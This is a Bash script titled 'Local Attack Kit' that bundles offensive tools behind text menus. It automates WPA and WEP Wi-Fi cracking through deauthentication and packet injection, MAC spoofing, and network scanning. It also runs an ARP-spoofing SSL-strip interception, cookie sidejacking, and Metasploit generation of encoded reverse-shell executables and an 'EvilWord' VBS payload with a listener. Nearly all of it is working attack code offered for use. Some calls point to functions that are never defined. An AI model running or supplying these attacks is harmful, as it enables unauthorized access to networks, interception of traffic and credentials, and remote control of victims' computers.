#!/bin/sh
wpacracker() {
injectiontest() {
clear
OS=`uname`
IO="" 
case $OS in
   Linux) DEVICE=`ifconfig -a | grep  "wlan*" | awk  '{print $1}'`;;
   *) DEVICE="Unknown";;
esac
aireplay-ng -9 $DEVICE
}
macspoof() {
OS=`uname`
IO="" 
mac='00:11:22:33:44:55'
case $OS in
   Linux) DEVICE=`ifconfig -a | grep  "wlan*" | awk  '{print $1}'`;;
   *) DEVICE="Unknown";;
esac
echo -n "Please Enter Mac Address You Would Like To Spoof: "
read spoof
ifconfig $DEVICE down
macchanger -m $spoof $DEVICE
clear 
ifconfig  $DEVICE up
echo "Your New Mac Address is $spoof"
} 

pyrit1() {
clear
OS=`uname`
IO="" 
mac='00:11:22:33:44:55'
case $OS in
   Linux) DEVICE=`ifconfig -a | grep  "wlan*" | awk  '{print $1}'`;;
   *) DEVICE="Unknown";;
esac
echo "Spoofing Mac Address New Mac $mac"
ifconfig $DEVICE down
macchanger -m $mac $DEVICE
clear
ifconfig $DEVICE up 
echo "Scanning For Access Points"
screen -m -D airodump-ng -w out --encrypt WPA $DEVICE &
sleep 10 
killall screen
cat out-01.csv |grep WPA |awk '{print $1} ' |cut -d "," -f 1
echo
echo -n "Please Enter Bssid: "
read bss
case $OS in
   Linux) channel=`cat out-01.csv |grep "$bss" |awk '{print $6} ' |cut -d "," -f 1 |cut -b 1-1 |cut -d "-" -f1 `;;
   *) channel="Unknown";;
esac
clear
sleep 2 
cat out-01.csv |grep "00:1E:2A:09:0B:08" |awk '{print $1} ' |cut -d "," -f 1 
echo 
echo -n "Please Enter Client To Deauthenticate: "
read vic
airodump-ng -c $channel -w wpa --bssid $bss $DEVICE &
screen -m -D aireplay-ng -0 30 -a $bss -c $vic $DEVICE 
sleep 10 
killall screen
killall airodump-ng
sleep 2
pyrit -r wpa-01.cap -i /pentest/passwords/wordlists/wpalist.txt attack_passthrough 
rm wpa-*
rm out-*
}


aircrack() { 
clear
OS=`uname`
IO="" 
mac='00:11:22:33:44:55'
case $OS in
   Linux) DEVICE=`ifconfig -a | grep  "wlan*" | awk  '{print $1}'`;;
   *) DEVICE="Unknown";;
esac
echo "Spoofing Mac Address New Mac $mac"
ifconfig $DEVICE down
macchanger -m $mac $DEVICE
clear
ifconfig $DEVICE up 
echo "Scanning For Access Points"
screen -m -D airodump-ng -w out --encrypt WPA $DEVICE &
sleep 10 
killall screen
cat out-01.csv |grep WPA |awk '{print $1} ' |cut -d "," -f 1
echo
echo -n "Please Enter Bssid: "
read bss
case $OS in
   Linux) channel=`cat out-01.csv |grep "$bss" |awk '{print $6} ' |cut -d "," -f 1 |cut -b 1-1 |cut -d "-" -f1 `;;
   *) channel="Unknown";;
esac
clear
sleep 2 
cat out-01.csv |grep "00:1E:2A:09:0B:08" |awk '{print $1} ' |cut -d "," -f 1 
echo 
echo -n "Please Enter Client To Deauthenticate: "
read vic
airodump-ng -c $channel -w wpa --bssid $bss $DEVICE &
screen -m -D aireplay-ng -0 30 -a $bss -c $vic $DEVICE 
sleep 10 
killall screen
killall airodump-ng
aircrack-ng -w /pentest/passwords/wordlists/wpalist.txt wpa-01.cap -b $bss  
rm wpa-*
rm out-*


}

menu1() {
   clear
cat << EOF
 
       .----------------.  .----------------.  .----------------. 
      | .--------------. || .--------------. || .--------------. |
      | |   _____      | || |      __      | || |  ___  ____   | |
      | |  |_   _|     | || |     /  \     | || | |_  ||_  _|  | |
      | |    | |       | || |    / /\ \    | || |   | |_/ /    | |
      | |    | |   _   | || |   / ____ \   | || |   |  __'.    | |
      | |   _| |__/ |  | || | _/ /    \ \_ | || |  _| |  \ \_  | |
      | |  |________|  | || ||____|  |____|| || | |____||____| | |
      | |              | || |              | || |              | |
      | '--------------' || '--------------' || '--------------' |
       '----------------'  '----------------'  '----------------' 

EOF

   
echo "   Please Select A Type Of Attack"
echo
echo "      1. WPA Pyrit Cuda"
echo "      2. WPA Aircrack"
echo "      3  Injection Test"
echo "      4. Spoof Mac Address"
echo "      5. Exit"
echo
echo -n ">>"
}
menu2() {

   while true
   do
   menu1
   read answer
   case $answer in
   1)
      pyrit1
  ;;   
   2)
      aircrack
  ;;
   3)
      injectiontest
  ;;
   4)
      macspoof  
  ;;
   5)
      exit
  ;;
   *)
     menu2
  ;;
   esac
   done
}

case "$1" in
    help)
   menu2
  ;;     

    *)
   menu2
  ;;
esac
}
autonmap() {
clear
cat <<EOF
       .----------------.  .----------------.  .----------------. 
      | .--------------. || .--------------. || .--------------. |
      | |   _____      | || |      __      | || |  ___  ____   | |
      | |  |_   _|     | || |     /  \     | || | |_  ||_  _|  | |
      | |    | |       | || |    / /\ \    | || |   | |_/ /    | |
      | |    | |   _   | || |   / ____ \   | || |   |  __'.    | |
      | |   _| |__/ |  | || | _/ /    \ \_ | || |  _| |  \ \_  | |
      | |  |________|  | || ||____|  |____|| || | |____||____| | |
      | |              | || |              | || |              | |
      | '--------------' || '--------------' || '--------------' |
       '----------------'  '----------------'  '----------------'        
EOF
OS=`uname`
IO="" # store IP
case $OS in
Linux) IP=`ip route show  | grep 'via'| awk '{ print $3}'`;;
*) IP="Unknown";;
esac
echo "Scanning $IP/24 This Could Take Some Time"

nmap -PN -O -sV  $IP/24 -p 0-65535 --open  -oN report
}
evilword() { 
cat << EOF
 
       .----------------.  .----------------.  .----------------. 
      | .--------------. || .--------------. || .--------------. |
      | |   _____      | || |      __      | || |  ___  ____   | |
      | |  |_   _|     | || |     /  \     | || | |_  ||_  _|  | |
      | |    | |       | || |    / /\ \    | || |   | |_/ /    | |
      | |    | |   _   | || |   / ____ \   | || |   |  __'.    | |
      | |   _| |__/ |  | || | _/ /    \ \_ | || |  _| |  \ \_  | |
      | |  |________|  | || ||____|  |____|| || | |____||____| | |
      | |              | || |              | || |              | |
      | '--------------' || '--------------' || '--------------' |
       '----------------'  '----------------'  '----------------' 

EOF
echo 
echo "Generating Evil VBS File Script Will Be Located In /root/"
OS=`uname`
IO="" 
case $OS in
   Linux) LHOST=`ip route show |grep src |awk '{print $9}' |head -1`;;
   *) LHOST="Unknown";;
esac

cd /pentest/exploits/framework/
./msfpayload windows/shell/reverse_tcp LHOST=$LHOST LPORT=4444 R | msfencode -e x86/shikata_ga_nai -c 5 -x /pentest/windows-binaries/pstools/psexec.exe -t raw > RVR.R

sleep 2 
python shellcode2vbscript.py RVR.R /root/RVR.vbs
sleep 5 
./msfcli exploit/multi/handler PAYLOAD=windows/x86/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 E
}
Windowsx86() {
clear
cat << EOF 

Please Select A Payload:

windows/meterpreter/bind_ipv6_tcp                Windows Meterpreter (Reflective Injection), Bind TCP Stager (IPv6)
windows/meterpreter/bind_tcp                     Windows Meterpreter (Reflective Injection), Bind TCP Stager
windows/meterpreter/find_tag                     Windows Meterpreter (Reflective Injection), Find Tag Ordinal Stager
windows/meterpreter/reverse_ipv6_tcp             Windows Meterpreter (Reflective Injection), Reverse TCP Stager (IPv6)
windows/meterpreter/reverse_tcp                  Windows Meterpreter (Reflective Injection), Reverse TCP Stager
windows/shell/bind_tcp                           Windows Command Shell, Bind TCP Stager
windows/shell/find_tag                           Windows Command Shell, Find Tag Ordinal Stager
windows/shell/reverse_ipv6_tcp                   Windows Command Shell, Reverse TCP Stager (IPv6)
windows/shell/reverse_tcp                        Windows Command Shell, Reverse TCP Stager
windows/shell_bind_tcp                           Windows Command Shell, Bind TCP Inline
windows/shell_bind_tcp_xpfw                      Windows Disable Windows ICF, Command Shell, Bind TCP Inline
windows/shell_reverse_tcp                        Windows Command Shell, Reverse TCP Inline
windows/vncinject/bind_ipv6_tcp                  VNC Server (Reflective Injection), Bind TCP Stager (IPv6)
windows/vncinject/bind_tcp                       VNC Server (Reflective Injection), Bind TCP Stager
windows/vncinject/find_tag                       VNC Server (Reflective Injection), Find Tag Ordinal Stager
windows/vncinject/reverse_ipv6_tcp               VNC Server (Reflective Injection), Reverse TCP Stager (IPv6)
windows/vncinject/reverse_tcp                    VNC Server (Reflective Injection), Reverse TCP Stager



EOF
echo -n "LAK>"
read List
clear
cat << EOF

Please Select A Encoder:
 
x86/alpha_mixed            Alpha2 Alphanumeric Mixedcase Encoder
x86/alpha_upper            Alpha2 Alphanumeric Uppercase Encoder
x86/avoid_utf8_tolower     Avoid UTF8/tolower
x86/call4_dword_xor        Call+4 Dword XOR Encoder
x86/countdown              Single-byte XOR Countdown Encoder
x86/fnstenv_mov            Variable-length Fnstenv/mov Dword XOR Encoder
x86/jmp_call_additive      Polymorphic Jump/Call XOR Additive Feedback Encoder
x86/nonalpha               Non-Alpha Encoder
x86/nonupper               Non-Upper Encoder
x86/shikata_ga_nai         Polymorphic XOR Additive Feedback Encoder
x86/unicode_mixed          Alpha2 Alphanumeric Unicode Mixedcase Encoder
x86/unicode_upper          Alpha2 Alphanumeric Unicode Uppercase Encoder

EOF

echo -n "LAK>"
read A
clear
echo -n "Please enter your ip: "
echo 
echo -n "LAK>"
read ip
clear
echo -n "Pleas enter port: "
echo 
echo -n "LAK>"
read port
echo 
echo -n "Please Wait While Payload is Generated...."
clear
sleep 1
msfpayload windows/shell/reverse_tcp  LHOST=$ip LPORT=$port ENCODING=$A X > /root/out.exe

msfcli exploit/multi/handler PAYLOAD=$List LHOST=$ip LPORT=$port ENCODING=$A E  

}

Windowsx64() {
clear
 cat << EOF 
Please Select A Payload:
    
windows/x64/exec                        Execute Command
windows/x64/meterpreter/bind_tcp        Meterpreter,Bind TCP Stager
windows/x64/meterpreter/reverse_tcp     Meterpreter,Reverse TCP Stager
windows/x64/shell/bind_tcp              Command Shell,Bind TCP Stager
windows/x64/shell/reverse_tcp           Command Shell,Reverse TCP Stager
windows/x64/shell_bind_tcp              Command Shell,Bind TCP Inline
windows/x64/shell_reverse_tcp           Command Shell,Reverse TCP Inline
 

EOF
echo -n "LAK>"
read List
clear
cat << EOF

Please Select A Encoder:
 
x86/alpha_mixed            Alpha2 Alphanumeric Mixedcase Encoder
x86/alpha_upper            Alpha2 Alphanumeric Uppercase Encoder
x86/avoid_utf8_tolower     Avoid UTF8/tolower
x86/call4_dword_xor        Call+4 Dword XOR Encoder
x86/countdown              Single-byte XOR Countdown Encoder
x86/fnstenv_mov            Variable-length Fnstenv/mov Dword XOR Encoder
x86/jmp_call_additive      Polymorphic Jump/Call XOR Additive Feedback Encoder
x86/nonalpha               Non-Alpha Encoder
x86/nonupper               Non-Upper Encoder
x86/shikata_ga_nai         Polymorphic XOR Additive Feedback Encoder
x86/unicode_mixed          Alpha2 Alphanumeric Unicode Mixedcase Encoder
x86/unicode_upper          Alpha2 Alphanumeric Unicode Uppercase Encoder

EOF
echo -n "LAK>"
read A
clear
echo -n "Please enter your ip: "
echo 
echo -n "LAK>"
read ip
clear
echo -n "Pleas enter port: "
echo 
echo -n "LAK>"
read port
echo 
echo -n "Please Wait While Payload is Being Generated...."
clear
sleep 1
msfpayload windows/x64/shell/reverse_tcp  LHOST=$ip LPORT=$port ENCODING=$A X > /root/out.exe

msfcli exploit/multi/handler PAYLOAD=$List LHOST=$ip LPORT=$port ENCODING=$A E  

}

menu12() {
clear
cat << EOF
      
       .----------------.  .----------------.  .----------------. 
      | .--------------. || .--------------. || .--------------. |
      | |   _____      | || |      __      | || |  ___  ____   | |
      | |  |_   _|     | || |     /  \     | || | |_  ||_  _|  | |
      | |    | |       | || |    / /\ \    | || |   | |_/ /    | |
      | |    | |   _   | || |   / ____ \   | || |   |  __'.    | |
      | |   _| |__/ |  | || | _/ /    \ \_ | || |  _| |  \ \_  | |
      | |  |________|  | || ||____|  |____|| || | |____||____| | |
      | |              | || |              | || |              | |
      | '--------------' || '--------------' || '--------------' |
       '----------------'  '----------------'  '----------------' 

EOF


           echo "   Please Select A Payload Type"
        echo
        echo "      1. Windowsx64"
        echo "      2. Windowsx86"
        echo "      3. EvilWord"
        echo "      4. Exit"
        echo 
        echo
        echo -n "LAK>"
   


}
loop() {

   while true
   do
   menu12
   read answer
   case $answer in
   1)
       Windowsx64
  ;;   
   2)
      Windowsx86
  ;;
   3)
      evilword
  ;;
   4)
   exit
  ;;
   *)
      loop
  ;;
   esac
   done
}





case "$1" in
    help)
   helploop
  ;;

    file)
      filoop
   ;;
   
    text)
   procloop
  ;;

   status)
   statloop
  ;;      

    *)
   helploop
  ;;
esac



wepcracker() {
macspoof() {
OS=`uname`
IO="" 
mac='00:11:22:33:44:55'
case $OS in
   Linux) DEVICE=`ifconfig -a | grep  "wlan*" | awk  '{print $1}'`;;
   *) DEVICE="Unknown";;
esac
echo -n "Please Enter Mac Address You Would Like To Spoof: "
read spoof
ifconfig $DEVICE down
macchanger -m $spoof $DEVICE
clear 
ifconfig  $DEVICE up
echo "Your New Mac Address is $spoof"
} 

korekchopchop() { 
clear
OS=`uname`
IO="" 
mac='00:11:22:33:44:55'
case $OS in
   Linux) DEVICE=`ifconfig -a | grep  "wlan*" | awk  '{print $1}'`;;
   *) DEVICE="Unknown";;
esac
echo "Spoofing Mac Address New Mac $mac"
ifconfig $DEVICE down
macchanger -m $mac $DEVICE
clear
ifconfig $DEVICE up 
echo "Scanning For Access Points"
xterm -e airodump-ng -w out --encrypt WEP $DEVICE &
sleep 10 

killall xterm 
case $OS in
   Linux) bssid=`cat out-01.csv |grep WEP |awk '{print $1} ' |cut -d "," -f 1`;;
   *) bssid="Unknown";;
esac
clear
echo $bssid
echo -n "Please Enter Bssid: "
read bss
case $OS in
   Linux) channel=`cat out-01.csv |grep "$bss" |awk '{print $6} ' |cut -d "," -f 1  `;;
   *) channel="Unknown";;
esac
airodump-ng -c $channel -w wep --ivs --bssid $bss $DEVICE &
xterm -e aireplay-ng -1 0 -a $bss -h $mac $DEVICE &
xterm -e aireplay-ng -4 -b $bss -h $mac  $DEVICE 
xterm -e packetforge-ng -0 -a $bss -h $mac -k 255.255.255.255 -l 255.255.255.255 -y replay*.xor -w /root/frag 
xterm -e aireplay-ng -2 -r frag -h $mac $DEVICE &
sleep 10 
xterm -e aircrack-ng wep*.ivs -l key 
killall xterm
killall airodump-ng 
rm out*
rm wep-0*
rm replay_*
rm frag
}

framentation() {
clear
OS=`uname`
IO="" 
mac='00:11:22:33:44:55'
case $OS in
   Linux) DEVICE=`ifconfig -a | grep  "wlan*" | awk  '{print $1}'`;;
   *) DEVICE="Unknown";;
esac
echo "Spoofing Mac Address New Mac $mac"
ifconfig $DEVICE down
macchanger -m $mac $DEVICE
clear
ifconfig $DEVICE up 
echo "Scanning For Access Points"
xterm -e airodump-ng -w out --encrypt WEP $DEVICE &
sleep 10 

killall xterm 
case $OS in
   Linux) bssid=`cat out-01.csv |grep WEP |awk '{print $1} ' |cut -d "," -f 1`;;
   *) bssid="Unknown";;
esac
clear
echo $bssid
echo -n "Please Enter Bssid: "
read bss
case $OS in
   Linux) channel=`cat out-01.csv |grep "$bss" |awk '{print $6} ' |cut -d "," -f 1  `;;
   *) channel="Unknown";;
esac
airodump-ng -c $channel -w wep --ivs --bssid $bss $DEVICE &
xterm  -e aireplay-ng -1 0 -a $bss -h $mac $DEVICE &
xterm  -e aireplay-ng -5 -b $bss -h $mac  $DEVICE 
xterm  -e packetforge-ng -0 -a $bss -h $mac -k 255.255.255.255 -l 255.255.255.255 -y fragment*.xor -w frag 
xterm  -e aireplay-ng -2 -r frag -h $mac $DEVICE
sleep 10 
xterm -e aircrack-ng wep*.ivs -l key 
killall xterm
killall airodump-ng 
rm out*
rm wep-0*
rm replay_*
rm frag
}

injectiontest() {
clear
OS=`uname`
IO="" 
case $OS in
   Linux) DEVICE=`ifconfig -a | grep  "wlan*" | awk  '{print $1}'`;;
   *) DEVICE="Unknown";;
esac
aireplay-ng -9 $DEVICE
}

client0841() {
clear
OS=`uname`
IO="" 
mac='00:11:22:33:44:55'
case $OS in
   Linux) DEVICE=`ifconfig -a | grep  "wlan*" | awk  '{print $1}'`;;
   *) DEVICE="Unknown";;
esac
echo "Spoofing Mac Address New Mac $mac"
ifconfig $DEVICE down
macchanger -m $mac $DEVICE
clear
ifconfig $DEVICE up 
echo "Scanning For Access Points"
xterm -e airodump-ng -w out --encrypt WEP $DEVICE &
sleep 10 

killall xterm 
case $OS in
   Linux) bssid=`cat out-01.csv |grep WEP |awk '{print $1} ' |cut -d "," -f 1`;;
   *) bssid="Unknown";;
esac
clear
echo $bssid
echo -n "Please Enter Bssid: "
read bss
case $OS in
   Linux) channel=`cat out-01.csv |grep "$bss" |awk '{print $6} ' |cut -d "," -f 1  `;;
   *) channel="Unknown";;
esac
airodump-ng -c $channel -w wep --ivs --bssid $bss $DEVICE &
xterm -e aireplay-ng -1 0 -a $bss -h $mac $DEVICE &
xterm -e aireplay-ng -2 -b $bss -t 1 -d FF:FF:FF:FF:FF:FF  -h $mac $DEVICE.&
sleep 10 
xterm -e aircrack-ng wep*.ivs -l key 
killall xterm
killall airodump-ng
rm out* 
rm wep-0*
rm replay_*
}



arpreplay() { 
clear
OS=`uname`
IO="" 
mac='00:11:22:33:44:55'
case $OS in
   Linux) DEVICE=`ifconfig -a | grep  "wlan*" | awk  '{print $1}'`;;
   *) DEVICE="Unknown";;
esac
echo "Spoofing Mac Address New Mac $mac"
ifconfig $DEVICE down
macchanger -m $mac $DEVICE
clear
ifconfig $DEVICE up 
echo "Scanning For Access Points"
xterm -e airodump-ng -w out --encrypt WEP $DEVICE &
sleep 10 

killall xterm 
case $OS in
   Linux) bssid=`cat out-01.csv |grep WEP |awk '{print $1} ' |cut -d "," -f 1`;;
   *) bssid="Unknown";;
esac
clear
echo $bssid
echo -n "Please Enter Bssid: "
read bss
case $OS in
   Linux) channel=`cat out-01.csv |grep "$bss" |awk '{print $6} ' |cut -d "," -f 1  `;;
   *) channel="Unknown";;
esac
airodump-ng -c $channel -w wep --ivs --bssid $bss $DEVICE &
xterm -e aireplay-ng -1 0 -a $bss -h $mac $DEVICE &
xterm -e aireplay-ng -3 -b $bss -h $mac $DEVICE &
sleep 10 
xterm -e aircrack-ng wep*.ivs -l key 
killall xterm
killall airodump-ng 
rm out*
rm wep-0*
rm replay_*
}

menu1() {
   clear
tput setaf 9; cat << EOF
       .----------------.  .----------------.  .----------------. 
      | .--------------. || .--------------. || .--------------. |
      | |   _____      | || |      __      | || |  ___  ____   | |
      | |  |_   _|     | || |     /  \     | || | |_  ||_  _|  | |
      | |    | |       | || |    / /\ \    | || |   | |_/ /    | |
      | |    | |   _   | || |   / ____ \   | || |   |  __'.    | |
      | |   _| |__/ |  | || | _/ /    \ \_ | || |  _| |  \ \_  | |
      | |  |________|  | || ||____|  |____|| || | |____||____| | |
      | |              | || |              | || |              | |
      | '--------------' || '--------------' || '--------------' |
       '----------------'  '----------------'  '----------------'        
            
EOF
   
echo "   Please Select A Type Of Attack"
echo
echo "      1. Client Based Arp Replay"
echo "      2. Client Based 0841"
echo "      3. Clientless Fragmentation"
echo "      4. Clientless Korek Chop Chop"
echo "      5  Injection Test"
echo "      6. Spoof Mac Address"
echo "      7. Exit"
echo
echo -n "     LAK>"
}
menu2() {

   while true
   do
   menu1
   read answer
   case $answer in
   1)
      arpreplay
  ;;   
   2)
      client0841
  ;;
   3)
      framentation
  ;;
   4)
      korekchopchop  
  ;;
   5)
      injectiontest
  ;;
   6)
    macspoof
  ;;
   7)
    exit
  ;;
   *)
     menu2
  ;;
   esac
   done
}

case "$1" in
    help)
   menu2
  ;;     

    *)
   menu2
  ;;
esac
}
sslsniff() {
clear
cat << EOF
 
       .----------------.  .----------------.  .----------------. 
      | .--------------. || .--------------. || .--------------. |
      | |   _____      | || |      __      | || |  ___  ____   | |
      | |  |_   _|     | || |     /  \     | || | |_  ||_  _|  | |
      | |    | |       | || |    / /\ \    | || |   | |_/ /    | |
      | |    | |   _   | || |   / ____ \   | || |   |  __'.    | |
      | |   _| |__/ |  | || | _/ /    \ \_ | || |  _| |  \ \_  | |
      | |  |________|  | || ||____|  |____|| || | |____||____| | |
      | |              | || |              | || |              | |
      | '--------------' || '--------------' || '--------------' |
       '----------------'  '----------------'  '----------------' 

EOF
OS=`uname`
IO="" 
case $OS in
   Linux) iface=`ifconfig -a | grep  "wlan*" | awk  '{print $1}'`;;
   *) iface="Unknown";;
esac
OS=`uname`
IO="" 
case $OS in
   Linux) tdg=`ip route show |grep "via" | awk  '{print $3}'`;;
   *) tdg="Unknown";;
esac
echo -n "Please Enter Target Ip To Sniff: "
read tip
clear
cat << EOF
 
       .----------------.  .----------------.  .----------------. 
      | .--------------. || .--------------. || .--------------. |
      | |   _____      | || |      __      | || |  ___  ____   | |
      | |  |_   _|     | || |     /  \     | || | |_  ||_  _|  | |
      | |    | |       | || |    / /\ \    | || |   | |_/ /    | |
      | |    | |   _   | || |   / ____ \   | || |   |  __'.    | |
      | |   _| |__/ |  | || | _/ /    \ \_ | || |  _| |  \ \_  | |
      | |  |________|  | || ||____|  |____|| || | |____||____| | |
      | |              | || |              | || |              | |
      | '--------------' || '--------------' || '--------------' |
       '----------------'  '----------------'  '----------------' 
EOF

echo "The selected interface is $iface"
echo "The target gateway is $tdg"
echo "Starting....."
sleep 2 
clear
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
xterm -e arpspoof -i $iface -t $tip $tdg &
xterm -e  python /pentest/web/sslstrip/sslstrip.py -a -l 8080 &
clear
ettercap -T -q -i $iface -M arp:remote /$tip/ /$tdg/

}

sidejack() {
clear
cat << EOF
 
       .----------------.  .----------------.  .----------------. 
      | .--------------. || .--------------. || .--------------. |
      | |   _____      | || |      __      | || |  ___  ____   | |
      | |  |_   _|     | || |     /  \     | || | |_  ||_  _|  | |
      | |    | |       | || |    / /\ \    | || |   | |_/ /    | |
      | |    | |   _   | || |   / ____ \   | || |   |  __'.    | |
      | |   _| |__/ |  | || | _/ /    \ \_ | || |  _| |  \ \_  | |
      | |  |________|  | || ||____|  |____|| || | |____||____| | |
      | |              | || |              | || |              | |
      | '--------------' || '--------------' || '--------------' |
       '----------------'  '----------------'  '----------------' 

EOF
echo -n "Please Set Proxy to http://127.0.0.1 on port 1234 in firefox"
echo
sleep 5 
echo 
OS=`uname`
IO="" 
case $OS in
   Linux) iface=`ifconfig -a | grep  "wlan*" | awk  '{print $1}'`;;
   *) iface="Unknown";;
esac 
/pentest/sniffers/hamster/ferret -i $iface & 
xterm -e /pentest/sniffers/hamster/hamster 
killall hamster
killall ferret
}
menu1(){
clear
cat << EOF
       .----------------.  .----------------.  .----------------. 
      | .--------------. || .--------------. || .--------------. |
      | |   _____      | || |      __      | || |  ___  ____   | |
      | |  |_   _|     | || |     /  \     | || | |_  ||_  _|  | |
      | |    | |       | || |    / /\ \    | || |   | |_/ /    | |
      | |    | |   _   | || |   / ____ \   | || |   |  __'.    | |
      | |   _| |__/ |  | || | _/ /    \ \_ | || |  _| |  \ \_  | |
      | |  |________|  | || ||____|  |____|| || | |____||____| | |
      | |              | || |              | || |              | |
      | '--------------' || '--------------' || '--------------' |
       '----------------'  '----------------'  '----------------' 
                           
Local Attack Kit Main Menu :                            

     1. WEP Cracking
     2. WPA Cracking
     3. SSL Sniffing
     4. Side Jacking
     5. AutoNmap
     6. PayloadGen
     7. Exit
  
EOF
echo 
echo 
echo -n "     LAK>"
}
menu2() {

   while true
   do
   menu1
   read answer
   case $answer in
   1)
      wepcracker
  ;;   
   2)
      wpacracker
  ;;
   3)
      sslsniff
  ;;
   4)
      sidejack  
  ;;
   5)
      autonmap
  ;;
   6)
    loop
  ;;
   7)
  exit
  ;;
   *)
     menu2
  ;;
   esac
   done
}
case "$1" in
    help)
   menu2
  ;;

    file)
      filoop
   ;;
   
    text)
   procloop
  ;;

   status)
   statloop
  ;;      

    *)
   menu2
  ;;
esac
